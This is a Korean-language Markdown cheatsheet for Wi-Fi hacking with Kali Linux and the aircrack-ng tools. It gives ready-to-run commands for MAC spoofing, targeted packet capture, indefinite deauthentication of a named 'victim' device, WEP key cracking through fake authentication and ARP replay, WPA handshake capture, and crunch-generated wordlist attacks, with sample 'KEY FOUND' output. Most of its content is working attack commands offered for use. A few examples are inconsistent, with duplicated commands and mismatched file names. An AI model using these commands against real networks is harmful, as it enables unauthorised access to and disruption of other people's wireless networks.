# 네트워크 해킹 Cheatsheet

## Requirement

- **무선 랜카드** 구비
  - `Kali Linux` 환경과 호환 가능
  - `monitor` 모드 설정 가능
- `Kali Linux` VM

## Mode Switching

### `managed` -> `monitor`

``` zsh
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

### `monitor` -> `managed`

``` zsh
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
```

## MAC Address Fabrication

``` zsh
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```

## `airodump-ng`

- 선행 조건
  - monitor 모드 활성화 *(필수)*
  - 5GHz 인식 가능한 무선 랜카드 *(필요 시)*

### Nontargeted

#### `2.4GHz` Only

``` zsh
airodump-ng wlan0
```

#### `5GHz` Only

``` zsh
airodump-ng --band a wlan0
```

#### `2.4GHz` & `5GHz`

``` zsh
airodump-ng --band abg wlan0
```

### Targeted

- 선행 조건
  - 공격 대상 AP의 `BSSID` 파악

#### Scan Only

``` zsh
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0
```

#### Scan w/ `--write` option

``` zsh
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0
```

#### See log files

press Ctrl+C and kill the airodump-ng scan

``` zsh
# home 경로 목록 확인
ls

# '-01'자가 붙어서 생성되는 파일들을 확인
# test-01.cap
# test-01.csv
# test-01.kismet.csv
# test-01.kismet.netxml
```

```zsh
# Wireshark 열기
wireshark
```

- `Wireshark`를 통한 `.cap` 분석하는 방법
  1. `Wireshark` GUI
  2. `File` - `Open`으로 창 열기
  3. 파일 `test-01.csv` 선택

#### Use `Wireshark`

## Deauthentication Attack

**약칭: `deauth`**

- 선행 조건
  - 공격 대상 AP의 `BSSID` 파악

### `deauth` Script

``` zsh
aireplay-ng --deauth 0 -a 00:99:88:77:66:55 -c 00:11:22:33:44:55 wlan0
```

### `deauth` Description

#### `--deauth`

이 명령으로 던질 Deauth 공격 패킷의 양

- 예시
  - `0`: **영원히** 패킷을 던짐(영구 지속)
  - `1`: 패킷을 **1개**만 던짐
  - `2`: 패킷을 **2개** 던짐(단발성 Deauth 공격의 최소 기준)
  - `1000000`: 패킷을 **1,000,000개** 던짐 (반응 확인용)

- **팁: 용도별 적정 개수**
  - 단발성으로 Deauth가 필요한 경우: `2 ~ 4`; 최소 `2`, **권장 `4`**
  - 장기간 Deauth가 필요한 경우: `1000000`(큰 수) 혹은 `0`(영구)

- 키워드 정리
  - `-a`
    - 타겟으로 잡은 특정 AP의 MAC Address
    (= 희생자가 접속 중인 Wi-Fi 공유기의 Mac Address)
  - `-c`
    - 희생자의 디바이스 Mac Address
    (예: 랩탑, 스마트폰, 기타 Wi-Fi 접속이 필요한 IoT 기기 등...)

## `WEP` Hacking

### WEP Hack 전 선행 공격

- **[`airodump-ng` - 'targeted' 공격 실행](#targeted)**
  1. 아래 `# 예시`처럼 감청 상태를 유지 중인가?
  2. `*-01.cap` 형태로 충분한 패킷 기록이 남은 덤프 파일이 확보되어 있는가?
  3. 만약 비활성화 or 충분한 패킷 수집이 불가하다면, **[Fake Authentication Attack](#fake-authentication-attack)** 및 **[ARP Request Replay](#arp-request-replay)** 를 통해 충분한 양의 패킷 수집

``` zsh
# 예시
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write basic_wep wlan0
```

### WEP Hack 공격 실행

충분한 양의 덤프 파일 `basic_wep-01.cap`를 확보하였다고 가정할 때,

``` zsh
aircrack-ng basic-wep-01.cap 
```

결과는 다음과 같고, 아래와 같은 문구가 나오는지 확인

``` zsh
# ...
KEY FOUND! [ 5A:61:6B:6B:30 ] (ASCII: Zakk0 )
# ...
```

얻은 `KEY`를 통해 랩탑이나 스마트폰으로 와이파이 접속 시도

``` zsh
# 찾은 키 값을 바탕으로, 일반 디바이스로 와이파이 로그인 시도

# 1. 변환된 문자열 그대로 이용 
Wi-Fi SSID: Zako
Password: Zakk0

# 2. ACSII 코드 이용(콜론은 다 지워야 함)
# 5A:61:6B:6B:30 -> 5A616B6B30
Wi-Fi SSID: Zako
Password: 5A616B6B30

# ... Connected!
```

## Fake Authentication Attack

**약칭: `fakeauth`**

### `fakeauth` 사용 조건

- 비활성화된 네트워크
or 매우 느린 속도로만 패킷이 오고가는 네트워크
  - `#Data,` 항목이 0인 경우 -> 감청이 불가능하거나 매우 오래 걸림
  - AP에서 새로운 IV(초기화 벡터)를 가지고 새로운 패킷을 많이 만들어야 함
  - 비밀번호가 없어 접속은 불가하지만, 인증 시도는 계속 할 수 있음!

**`Connection`은 안돼도, `Association`은 할 수 있음!**

### `fakeauth` 공격 실행

#### `fakeauth` 감청 시작

``` zsh
# 예시
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write arpreplay wlan0
# `#Data,`가 계속 0이거나, 감청이 불가할 정도로 느리게 상승함을 확인
# 연결 계속 유지!
```

#### `fakeauth` 주입

``` zsh
aireplay-ng --fakeauth 0 -a 00:99:88:77:66:55 -h 00:AA:88:66:44:22 wlan0
## `Association`을 시켜주는 것이 키포인트!
```

#### `fakeauth` 키워드 정리

- `-a`
  - 타겟으로 잡은 특정 AP의 MAC Address
  (= 희생자가 접속 중인 Wi-Fi 공유기의 Mac Address)
- `-h`
  - 공격자의 무선 랜카드 Mac Address
  (= 가짜 인증 요청을 쏠 기계)

#### `fakeauth` 신호 감지 확인

1. `STATION`에 내 무선 랜카드의 MAC Address가 뜨기 시작함.

2. `Beacons` 수치가 마구 치솟기 시작하면 성공!

3. 이 자체가 새 IV로 새 패킷을 강제로 생성하는 과정임!

## ARP Request Replay

**약칭: `arpreplay`**

### `arpreplay` 사용 조건

`Fake Authentication Attack`를 통해 충분한 데이터 연결 시도(`Beacons` 수치 증가)가 되어있는 상태여야 함.

### `arpreplay` 공격 실행

#### `arpreplay` 전 선행 공격

- **[`fakeauth` 공격 실행](#fakeauth-공격-실행)**
  1. `airodump-ng`로 감청 실행 중인가?
  2. `fakeauth`로 `Association` 수립이 되었는가?

#### `arpreplay` 주입

``` zsh
aireplay-ng --arpreplay 0 -b 00:99:88:77:66:55 -h 00:AA:88:66:44:22 wlan0
```

#### `arpreplay` 키워드 정리

- `-b`
  - 타겟으로 잡은 특정 AP의 MAC Address
  (= 희생자가 접속 중인 Wi-Fi 공유기의 Mac Address)
  - 이 공유기가 공격자의 무선 랜카드한테 ARP Request를 보내게 만들 것임!

- `-h`
  - 공격자의 무선 랜카드 Mac Address
  (= 가짜 인증 요청을 쏠 기계)
  - 공유기가 쏘는 ARP Request를 모아서, `WEP` Hacking에 필요한 `#Data,`를 수집할 것임!

#### `arpreplay` 결과 dump 파일 생성

- 체크리스트
  - `airodump-ng` 감청 창에서, `Beacons`와 `#Data,`가 동시에 폭발적으로 증가하는가?
  - 이 상태가 수십 초 ~ 수 분 동안 지속되는가?

체크리스트 충족 시, 아래의 스크립트를 사용한다.

``` zsh
aircrack-ng arpreplay-01.cap 
```

결과는 다음과 같은 형태로 나온다.

``` zsh
## 실패 시 예시 구문(데이터 부족 등)
Failed. Next try with 30000 IVs.

## 성공 시 예시 구문
# ...
KEY FOUND! [ 5A:61:6B:6B:30 ] (ASCII: Zakk0 )
# ...
```

## WPS

(작성 중)

## WPA/WPA2

- 도움되는 링크
  - [DWPA](https://wpa-sec.stanev.org/)
    - 분산형 `WPA handshake` 데이터베이스
    - 공격에 필요한 **Wordlist 제공**

### Handshake Capturing

``` zsh
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write wpa_handshake wlan0
```

``` zsh
# deauth는 2 ~ 4 사이(한 번만 끊는다는 느낌)
aireplay-ng --deauth 4 -a 00:99:88:77:66:55 -c 00:11:22:33:44:55 wlan0
```

``` zsh
[ WPA handshake: (Mac Address)]
# ... 
```

**주의: `WPA handshake` 로는 비밀번호 파악 불가!**
대신, 비밀번호의 **일치/불일치 여부**만 파악 가능!

### Wordlist

원리: Brute Force or Dictionary Attack

`# crunch [min] [max] [characters] -t [pattern] -o [FileName]`

- 설명
  - `[min]`: 최소 문자 개수
  - `[max]`: 최대 문자 개수
  - `[characters]`: 조합 가능한 문자열 집합 (대소문자 구분)
  - `-t [pattern]`: 고정할 패턴(조합을 원하는 부분은 `@`로 표시)
  - `-o [FileName]`: `[FileName]`으로 문자열 리스트 저장

``` zsh
# 예시 1
crunch 5 6 123ab -o wordlist_1.txt
```

``` zsh
# 예시 2
crunch 6 8 123abc$ -t a@@@@@b -o wordlist_2.txt
```

### Wordlist Attack

``` zsh
aircrack-ng wpa_handshake-01.cap -w test.txt
```
